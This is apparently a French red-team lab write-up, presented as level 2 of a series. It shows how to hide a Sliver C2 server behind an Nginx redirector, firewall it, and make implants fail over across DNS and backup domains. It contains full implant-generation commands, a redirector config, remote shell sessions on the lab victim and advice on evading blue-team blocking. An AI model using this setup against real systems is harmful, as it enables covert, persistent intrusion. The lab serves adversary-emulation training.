---
Titre: Infra Red Team Level 2
tags:
  - C2
  - sliver
  - ngnix
  - DNS
date: 2026-11-07
categories: Red Team
Creator: d4fl0n
description: Cacher l'IP d'un serveur C2 Sliver derrière un redirecteur Nginx, verrouiller le team server, puis rendre le redirecteur réellement sacrifiable grâce au DNS et aux domaines de secours.
image:
  path: /assets/img/redteam.png
niveau: moyen
comments: "Avertissement. Tout ce qui suit est réalisé dans un lab personnel isolé (VirtualBox, réseau sans accès à Internet ni à un réseau tiers). Aucune machine réelle n'est visée. Ces techniques sont documentées à des fins d'apprentissage défensif et d'émulation d'adversaire. Ne les utilisez que sur une infrastructure que vous possédez ou pour laquelle vous avez une autorisation écrite. {: .prompt-danger }"
Author: d4fl0n
---
## Rappel du niveau 1

Au niveau 1, j'avais monté un C2 Sliver **en direct** : l'implant sur la cible parlait directement au team server. Ça fonctionne, on obtient un shell — mais c'est **indéfendable** du point de vue de l'attaquant. En capturant le trafic de la cible, on voyait :

- l'**IP du C2 en clair** (`Host: 10.0.2.126`) dans chaque requête ;
- une **périodicité** régulière, signature classique d'un beacon.

Conclusion : obfusquer le _contenu_ ne suffit pas. Tant que la cible parle en direct au C2, son IP est grillée et traçable en une requête. C'est le problème que le niveau 2 vient résoudre.

## Niveau 2

#### Topologie

```
Cible  ───►  Redirecteur Nginx  ───►  Team Server (Sliver)
10.0.2.75     10.0.2.127              10.0.2.126
              (IP exposée,            (IP cachée,
               jetable)                firewall verrouillé)
```

## Étape 1 — VM redirecteur + Nginx


**installation de nginx

nous allons installé `nginx`


```bash
d4fl0n@lab:~$ sudo apt install nginx
[sudo] password for d4fl0n: 
The following packages were automatically installed and are no longer required:
  gir1.2-adw-1                 libecal-2.0-3
  gir1.2-graphene-1.0          libedataserverui4-1.0-0t64
  gir1.2-gst-plugins-bad-1.0   libgeoclue-2-0
  gir1.2-gst-plugins-base-1.0  libgjs0g
  gir1.2-gtk-4.0               libical3t64
  gjs                          libjavascriptcoregtk-6.0-1
  gstreamer1.0-gtk4            libmozjs-128-0
  gstreamer1.0-libcamera       libwebkitgtk-6.0-4
  gstreamer1.0-pipewire
Use 'sudo apt autoremove' to remove them.

Installing:
  nginx
                                                                             
Installing dependencies:
  nginx-common
                                                                             
Suggested packages:
  fcgiwrap  nginx-doc

Summary:
  Upgrading: 0, Installing: 2, Removing: 0, Not Upgrading: 0
  Download size: 723 kB
  Space needed: 1,900 kB / 14.8 GB available

Continue? [Y/n] 
Get:1 http://deb.debian.org/debian trixie/main amd64 nginx-common all 1.26.3-3+deb13u7 [111 kB]
Get:2 http://deb.debian.org/debian trixie/main amd64 nginx amd64 1.26.3-3+deb13u7 [612 kB]
Fetched 723 kB in 7s (109 kB/s)                                             
Preconfiguring packages ...
Selecting previously unselected package nginx-common.
(Reading database ... 75822 files and directories currently installed.)
Preparing to unpack .../nginx-common_1.26.3-3+deb13u7_all.deb ...
Unpacking nginx-common (1.26.3-3+deb13u7) ...
Selecting previously unselected package nginx.
Preparing to unpack .../nginx_1.26.3-3+deb13u7_amd64.deb ...
Unpacking nginx (1.26.3-3+deb13u7) ...
Setting up nginx-common (1.26.3-3+deb13u7) ...
Created symlink '/etc/systemd/system/multi-user.target.wants/nginx.service' → '/usr/lib/systemd/system/nginx.service'.
Setting up nginx (1.26.3-3+deb13u7) ...
Upgrading binary: nginx.
Processing triggers for man-db (2.13.1-1) ...
d4fl0n@lab:~$ 
```

démarrage du serveur nginx

```bash
d4fl0n@lab:~$ sudo systemctl enable --now nginx
Synchronizing state of nginx.service with SysV service script with /usr/lib/systemd/systemd-sysv-install.
Executing: /usr/lib/systemd/systemd-sysv-install enable nginx
d4fl0n@lab:~$ 
```


```bash
┌──(kali㉿kali)-[~]
└─$ curl http://10.0.2.127
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 35em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

le serveur nginx est up
## Étape 2 — Config Nginx : proxy + leurre


Sur le redirecteur, remplaçons la config du site par défaut. Éditons `/etc/nginx/sites-available/default` :


```bash
d4fl0n@lab:~$ sudo nano /etc/nginx/sites-available/default
[sudo] password for d4fl0n: 
                                                                             
d4fl0n@lab:~$ cat /etc/nginx/sites-available/default
##
# You should look at the following URL's in order to grasp a solid understanding
# of Nginx configuration files in order to fully unleash the power of Nginx.
# https://www.nginx.com/resources/wiki/start/
# https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/
# https://wiki.debian.org/Nginx/DirectoryStructure
#
# In most cases, administrators will remove this file from sites-enabled/ and
# leave it as reference inside of sites-available where it will continue to be
# updated by the nginx packaging team.
#
# This file will automatically load configuration files provided by other
# applications, such as Drupal or Wordpress. These applications will be made
# available underneath a path with that package name, such as /drupal8.
#
# Please see /usr/share/doc/nginx-doc/examples/ for more detailed examples.
##

# Default server configuration
#
server {
    listen 80 default_server;
    server_name _;

    # Trafic C2 : on relaie vers le team server caché
    location / {
        proxy_pass http://10.0.2.126:8080;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
}

```

vérifions la config

```bash
d4fl0n@lab:~$ sudo nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
d4fl0n@lab:~$ 
```


```bash
d4fl0n@lab:~$ sudo systemctl reload nginx
d4fl0n@lab:~$ 
```

**Comprendre ce que ça fait :** toute requête qui arrive sur le redirecteur (port 80) est transmise au listener Sliver (`10.0.2.126:8080`). La cible ne parle qu'au redirecteur ; c'est Nginx qui parle au vrai C2.

## Étape 3 — Verrouiller le team server (l'étape OPSEC)

C'est l'étape qui donne tout son sens au niveau 2. Sans elle, n'importe qui connaissant l'IP du C2 peut encore l'atteindre directement. On ferme tout **sauf** le redirecteur, avec UFW, sur le team server :

```
sudo apt install -y ufw
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Autoriser UNIQUEMENT le redirecteur sur le port C2
sudo ufw allow from 10.0.2.200 to any port 8080

# T'autoriser toi-même en SSH (sinon tu te coupes l'accès)
sudo ufw allow from 10.0.2.200 to any port 22

sudo ufw enable
sudo ufw status verbose
```

Désormais, une tentative de connexion directe `cible → 10.0.2.126:8080` est **bloquée**. Seul le redirecteur peut atteindre le C2.
## Étape 4 — Régénérer l'implant vers le redirecteur

Dans la console Sliver, le listener reste le même (il écoute toujours sur `10.0.2.126:8080`, c'est Nginx qui lui parle). changeons seulement la cible C2 de l'implant :

```bash
[server] sliver > generate --http http://10.0.2.127:80 --os linux --arch amd64 --format elf --save /tmp/

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 6m29s
[*] Implant saved to /tmp/ROUND_HOMONYM
```

## Étape 5 — Vérifier et prouver le gain

```bash
[*] Session 84d43d53 ROUND_HOMONYM - tcp(10.0.2.127:39580)->10.0.2.75 (lab) - linux/amd64 - Sat, 07 Nov 2026 04:25:26 EST


                  
[server] sliver >
```


vérifions la sessions 

```bash
[server] sliver > sessions 

 ID         Transport   Remote Address                     Hostname   Usern~~
========== =========== ================================== ========== ======~~
 84d43d53   http(s)     tcp(10.0.2.127:39580)->10.0.2.75   lab        d4fl0~~

[server] sliver > 
```

utilisons la sessions 84d43d53

```bash
[server] sliver > use 84d43d53

[*] Active session ROUND_HOMONYM (84d43d53-a932-41d1-9989-6b9b22942ba3)

[server] sliver (ROUND_HOMONYM) >
```


```bash
[server] sliver (ROUND_HOMONYM) > shell

1u
[*] Shell management: `shell ls`, `shell attach <id>`
[*] Escape: press Ctrl-] to return to the Sliver client
[*] Opening shell tunnel ...

[*] Started remote shell [1] with pid 2738

                                          d4fl0n@lab:~$ 
d4fl0n@lab:~$ id
uid=1000(d4fl0n) gid=1000(d4fl0n) groups=1000(d4fl0n),27(sudo),100(users)
d4fl0n@lab:~$ 
```

## Étape 6 — inspection du Traffic réseau de la victime

```bash
d4fl0n@lab:~$ sudo tcpdump -i enp0s3 -w beacon_niv2.pcap 
tcpdump: listening on enp0s3, link-type EN10MB (Ethernet), snapshot length 262144 bytes

```

téléchargeons le Traffic réseau sur notre machine attaquant pour l'analyse

```bash
[server] sliver (ROUND_HOMONYM) > download beacon_niv2.pcap

[*] Wrote 98304 bytes (1 file successfully, 0 files unsuccessfully) to /root/beacon_niv2.pcap

[server] sliver (ROUND_HOMONYM) > 
```

lisons le fichier pacp

```bash
  185  13.686053   10.0.2.127 → 10.0.2.75    TCP 66 80 → 33414 [ACK] Seq=1 Ack=1179 Win=68096 Len=0 TSval=3269701300 TSecr=1036471688
  186  13.735707    10.0.2.75 → 10.0.2.127   TCP 74 33430 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=216580369 TSecr=0 WS=128
  187  13.738193   10.0.2.127 → 10.0.2.75    TCP 74 80 → 33430 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=3978876625 TSecr=216580369 WS=128
  188  13.739110    10.0.2.75 → 10.0.2.127   TCP 66 33430 → 80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=216580372 TSecr=3978876625
  189  13.740973   10.0.2.127 → 10.0.2.75    HTTP 238 HTTP/1.1 202 Accepted 
  190  13.741026    10.0.2.75 → 10.0.2.127   TCP 66 33414 → 80 [ACK] Seq=1179 Ack=173 Win=64128 Len=0 TSval=1036471744 TSecr=3269701353
  191  13.748198    10.0.2.75 → 10.0.2.127   TCP 74 33436 → 80 [SYN] Seq=0 Win=64240 Len=0 MSS=1460 SACK_PERM TSval=854637644 TSecr=0 WS=128
  192  13.749834   10.0.2.127 → 10.0.2.75    TCP 74 80 → 33436 [SYN, ACK] Seq=0 Ack=1 Win=65160 Len=0 MSS=1460 SACK_PERM TSval=1813366103 TSecr=854637644 WS=128
  193  13.752312    10.0.2.75 → 10.0.2.127   TCP 66 33436 → 80 [ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=854637649 TSecr=1813366103
  194  13.754607    10.0.2.75 → 10.0.2.127   HTTP 2065 POST /scripts/javascripts/app.js?u=3o18360291943 HTTP/1.1 
  195  13.757844   10.0.2.127 → 10.0.2.75    TCP 66 80 → 33414 [ACK] Seq=173 Ack=3178 Win=66176 Len=0 TSval=3269701370 TSecr=1036471758
  196  13.758543    10.0.2.75 → 10.0.2.127   HTTP 670 POST /scripts/javascripts/script/array.php?r=37670109332 HTTP/1.1 
  197  13.761070    10.0.2.75 → 10.0.2.127   TCP 66 33430 → 80 [FIN, ACK] Seq=1 Ack=1 Win=64256 Len=0 TSval=216580394 TSecr=3978876625
  198  13.764963   10.0.2.127 → 10.0.2.75    TCP 66 80 → 33436 [ACK] Seq=1 Ack=605 Win=64640 Len=0 TSval=1813366117 TSecr=854637655
  199  13.769532   10.0.2.127 → 10.0.2.75    TCP 66 80 → 33430 [ACK] Seq=1 Ack=2 Win=65280 Len=0 TSval=3978876655 TSecr=216580394
  200  13.773122   10.0.2.127 → 10.0.2.75    TCP 66 80 → 33430 [FIN, ACK] Seq=1 Ack=2 Win=65280 Len=0 TSval=3978876659 TSecr=216580394
  201  13.773229    10.0.2.75 → 10.0.2.127   TCP 66 33430 → 80 [ACK] Seq=2 Ack=2 Win=64256 Len=0 TSval=216580406 TSecr=3978876659
  202  13.817351   10.0.2.127 → 10.0.2.75    HTTP 238 HTTP/1.1 202 Accepted 
```

dans le Traffic réseau on ne verra que la conversation entre la machine compromis est notre redirecteur **** l'IP de notre C2 n'apparait nul part  

**Note: nous avons un peu avancé avec le niveau 2 mais nous ne somme pas toujours a l'abris  de l'équipe SOC (blue team)

**Remarque: Avantage de cette Architecture:

	1 l'IP de notre serveur C2 est a l'abri de l'equipe blue
	2 le C2 n'accepte aucune connexion provenant des machines compromis ou d'autre machine en dehors du serveur redirecteur
	
**** Remarque: cette Architecture a beaucoup des inconvénients:

	1 si l'equipe blue bloque l'IP du serveur redirecteur: la sessions est foutue 
	2 si le renseignement sur la menace detecte l'IP de notre serveur redirecteur comme malveillant: infra est foutu
	3 avec cette architecture nous ne pouvons pas sacrifié notre serveur redirecteur: l'IP est coder en dur dans l'implant


## Étape 7 — Evolution de infra avec l'utilisation du DNS

nous allons faire évolué notre infra C2 en utilisant ls DNS 

le domaine du serveur redirecteur sera `c2.d4fl0n.lab` 

générons l'implant avec le DNS

```bash
[server] sliver > generate --http http://c2.d4fl0n.lab --os linux --arch amd64 --format elf --save /tmp/

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 3m2s
[*] Implant saved to /tmp/THIN_STEM

```

comme c'est en local nous allons modifie le fichier `/etc/hosts` de la machine cible pour une résolution du DNS


nous avons obtenu une sessions avec le DNS

```bash
[*] Session 82225001 THIN_STEM - tcp(10.0.2.127:52696)->10.0.2.75 (lab) - linux/amd64 - Sat, 07 Nov 2026 05:36:21 EST


                  
[server] sliver > sessions 

 ID         Name        Transport   Remote Address                     Hostname   Username   Process (PID)                   Operating System   Locale   Last Message   Health  
========== =========== =========== ================================== ========== ========== =============================== ================== ======== ============== =========
 82225001   THIN_STEM   http(s)     tcp(10.0.2.127:52696)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/THIN_STEM (3067)   linux/amd64        en-US    2s ago         [ALIVE] 

[server] sliver > 
```

## Remarque:

**** Avantage de  notre Architecture avec le DNS:

	1 avec l'utilisation du DNS notre serveur redirecteur est sacrifiable
	2 si le blue team bloque l'IP du serveur redirecteur nous pouvons changer du serveur sans perdre la session pareil pour le renseignement sur la menace 

**** inconvénient de notre Architecture:

	1 si la blue team bloque le domaine sur la machine compromis: la session est foutu
	2 si le nom du domaine a ete saisi par quelqu'un d'autre: l'Infra est foutue



## Étape 8 — Evolution de l'Infra avec les domaines de secours

#### Domaines de secours — le principe

Au lieu d’un seul domaine, l’implant embarque **une liste**. S’il n’arrive pas à joindre le premier (bloqué, sinkholé), il **bascule automatiquement sur le suivant** au check-in.


**** génération de l'implant avec des domaine de secours

```bash
[server] sliver > generate --http http://c2.d4fl0n.lab,http://backup.d4fl0n.lab,http://cdn.d4fl0n.lab --os linux --arch amd64 --format elf --save /tmp/

[*] Generating new linux/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 4m0s
[*] Implant saved to /tmp/CONTEMPORARY_ENJOYMENT

[server] sliver > 
```

L’implant intègre les trois domaines. Priorité au premier ; bascule sur le suivant en cas d’échec.


nous avons eu notre session

```bash
[*] Session 627bc200 CONTEMPORARY_ENJOYMENT - tcp(10.0.2.127:42342)->10.0.2.75 (lab) - linux/amd64 - Sat, 07 Nov 2026 06:11:50 EST


[server] sliver > 
```


```bash
[server] sliver > sessions 

 ID         Name                     Transport   Remote Address                     Hostname   Username   Process (PID)                                Operating System   Locale   Last Message   Health  
========== ======================== =========== ================================== ========== ========== ============================================ ================== ======== ============== =========
 3809378d   CONTEMPORARY_ENJOYMENT   http(s)     tcp(10.0.2.127:60874)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/CONTEMPORARY_ENJOYMENT (3152)   linux/amd64        en-US    1s ago         [ALIVE] 
```

bloquant le le premier domaine qui est `c2.d4fl0n.lab`

```bash
[server] sliver > use 3809378d 

[*] Active session CONTEMPORARY_ENJOYMENT (3809378d-3d35-4d41-8aaa-f44672ec3d67)

[server] sliver (CONTEMPORARY_ENJOYMENT) > ls

/home/d4fl0n (25 items, 61.9 MiB)
=================================
drwx------  d4fl0n:d4fl0n  .                          <dir>      Sat Nov 07 12:09:24 +0100 2026
-rw-------  d4fl0n:d4fl0n  .bash_history              141 B      Sat Nov 07 10:33:23 +0100 2026
-rw-r--r--  d4fl0n:d4fl0n  .bash_logout               220 B      Thu Jul 23 23:27:28 +0100 2026
-rw-r--r--  d4fl0n:d4fl0n  .bashrc                    3.4 KiB    Thu Jul 23 23:27:28 +0100 2026
drwx------  d4fl0n:d4fl0n  .cache                     <dir>      Fri Jul 24 10:15:38 +0100 2026

```

notre session est toujours active malgré le blocage du domaine `c2.d4fl0n.lab`

bloquant le 2e domaine qui est `backup.d4fl0n.lab`

```bash
[server] sliver > sessions

 ID         Name                     Transport   Remote Address                     Hostname   Username   Process (PID)                                Operating System   Locale   Last Message   Health  
========== ======================== =========== ================================== ========== ========== ============================================ ================== ======== ============== =========
 1625fc4d   CONTEMPORARY_ENJOYMENT   http(s)     tcp(10.0.2.127:37156)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/CONTEMPORARY_ENJOYMENT (3152)   linux/amd64        en-US    2s ago         [ALIVE] 
 627bc200   CONTEMPORARY_ENJOYMENT   http(s)     tcp(10.0.2.127:42342)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/CONTEMPORARY_ENJOYMENT (3171)   linux/amd64        en-US    2m48s ago      [DEAD]  
 a967410b   CONTEMPORARY_ENJOYMENT   http(s)     tcp(10.0.2.127:34082)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/CONTEMPORARY_ENJOYMENT (3171)   linux/amd64        en-US    23s ago        [DEAD]  
 fab23345   CONTEMPORARY_ENJOYMENT   http(s)     tcp(10.0.2.127:42306)->10.0.2.75   lab        d4fl0n     /home/d4fl0n/CONTEMPORARY_ENJOYMENT (3157)   linux/amd64        en-US    3s ago         [ALIVE] 

[server] sliver > 

```

après le blocage du deuxième domaine notre sessions reste toujours active avec de nouvelle `ID` de session

le bloquant le 3 domaine 

```bash
[server] sliver > sessions

[*] No sessions 🙁

[server] sliver > 

```

toutes nos sessions sont perdu

**** Note: la remarque la plus important est le domaine `cdn.d4fl0n.lab` avec l'utilisation du CDN il est très difficile pour le blue team de nous bloqué parce que nous somme derrière le CDN s'il décide de bloque le CDN il bloquerons presque la moitié de la connexion au site web

**** Remarque: 

**** Avantage:

	1 cette fois-ci nous avons donnee du fil a retordre au blue team
	2 s'il bloque un de nos domaine l'autre prend le relais
	3 avec l'utilisation des domaines de secours nous pouvons survire tant que notre implant n'a pas ete éradiqué par l'equipe blue


**** inconvénient:

	1 si le blue team trouve toutes nos domaine et les bloque: session foutue



## Ce que le niveau 2 ne résout pas encore

Les domaines de secours protègent contre le **blocage réseau**, mais pas contre :

- le blocage simultané de **tous** les domaines (il faut un canal alternatif : DNS natif, HTTPS via CDN) ;
- la **détection sur l'hôte** (EDR, antivirus) — un autre plan de défense, côté implant, pas infra ;
- la **détectabilité du trafic** lui-même (pas de HTTPS, pas de profil malléable, redirecteur qui relaie tout sans filtrer).

Ce sera l'objet du **niveau 3 — infra mature** : redirecteur filtrant + site leurre, HTTPS et profil malléable, canaux multiples (DNS natif), domaines générés par algorithme (DGA), automatisation et visibilité défensive (RedELK).

> **Principe à retenir.** On ne vise jamais l'imblocable. On **augmente le coût du blocage** pour le défenseur — jusqu'à l'obliger à casser des services légitimes s'il veut nous couper. Chaque couche répond à une faiblesse constatée à la couche précédente. {: .prompt-tip }